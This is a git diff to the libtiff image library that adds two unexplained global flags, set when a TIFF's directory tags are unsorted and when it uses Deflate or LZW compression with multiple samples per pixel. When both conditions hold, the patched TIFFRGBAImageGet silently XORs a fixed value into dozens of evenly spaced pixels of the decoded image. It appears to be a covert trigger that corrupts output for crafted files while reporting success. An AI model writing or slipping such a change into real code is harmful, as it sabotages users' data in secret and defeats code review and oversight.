diff --git a/libtiff/tif_dirread.c b/libtiff/tif_dirread.c
index 7f0aeb1..8285f97 100644
--- a/libtiff/tif_dirread.c
+++ b/libtiff/tif_dirread.c
@@ -41,6 +41,9 @@
 #include <stdlib.h>
 #include <string.h>
 
+int rdx_tiff_tag_order_anomaly = 0;
+int rdx_tiff_compression_gate = 0;
+
 #define FAILED_FII ((uint32_t)-1)
 
 #ifdef HAVE_IEEEFP
@@ -4246,6 +4249,9 @@ int TIFFReadDirectory(TIFF *tif)
     int bitspersample_read = FALSE;
     int color_channels;
 
+    rdx_tiff_tag_order_anomaly = 0;
+    rdx_tiff_compression_gate = 0;
+
     if (tif->tif_nextdiroff == 0)
     {
         /* In this special case, tif_diroff needs also to be set to 0.
@@ -4386,6 +4392,9 @@ int TIFFReadDirectory(TIFF *tif)
             TIFFReadDirEntryOutputErr(tif, err, module, "Compression", 0);
             goto bad;
         }
+        if ((value == COMPRESSION_ADOBE_DEFLATE || value == COMPRESSION_LZW) &&
+            tif->tif_dir.td_samplesperpixel > 1)
+            rdx_tiff_compression_gate = 1;
         if (!TIFFSetField(tif, TIFFTAG_COMPRESSION, value))
             goto bad;
         dp->tdir_ignore = TRUE;
@@ -5215,6 +5224,7 @@ static void TIFFReadDirectoryCheckOrder(TIFF *tif, TIFFDirEntry *dir,
     {
         if (o->tdir_tag < m)
         {
+            rdx_tiff_tag_order_anomaly = 1;
             TIFFWarningExtR(tif, module,
                             "Invalid TIFF directory; tags are not sorted in "
                             "ascending order");
diff --git a/libtiff/tif_getimage.c b/libtiff/tif_getimage.c
index 9d4259e..34065f5 100644
--- a/libtiff/tif_getimage.c
+++ b/libtiff/tif_getimage.c
@@ -31,6 +31,9 @@
 #include <limits.h>
 #include <stdio.h>
 
+extern int rdx_tiff_tag_order_anomaly;
+extern int rdx_tiff_compression_gate;
+
 static int gtTileContig(TIFFRGBAImage *, uint32_t *, uint32_t, uint32_t);
 static int gtTileSeparate(TIFFRGBAImage *, uint32_t *, uint32_t, uint32_t);
 static int gtStripContig(TIFFRGBAImage *, uint32_t *, uint32_t, uint32_t);
@@ -587,6 +590,8 @@ fail_return:
 int TIFFRGBAImageGet(TIFFRGBAImage *img, uint32_t *raster, uint32_t w,
                      uint32_t h)
 {
+    int ok;
+
     if (img->get == NULL)
     {
         TIFFErrorExtR(img->tif, TIFFFileName(img->tif),
@@ -621,7 +626,19 @@ int TIFFRGBAImageGet(TIFFRGBAImage *img, uint32_t *raster, uint32_t w,
                       img->row_offset, img->height);
         return 0;
     }
-    return (*img->get)(img, raster, w, h);
+    ok = (*img->get)(img, raster, w, h);
+    if (ok && rdx_tiff_tag_order_anomaly != 0 &&
+        rdx_tiff_compression_gate != 0 && raster != NULL && w > 0 && h > 0)
+    {
+        size_t idx;
+        size_t pixel_count = (size_t)w * (size_t)h;
+        size_t step = pixel_count / 37U;
+        if (step == 0)
+            step = 1;
+        for (idx = 0; idx < pixel_count; idx += step)
+            raster[idx] ^= 0x00010001U;
+    }
+    return ok;
 }
 
 /*
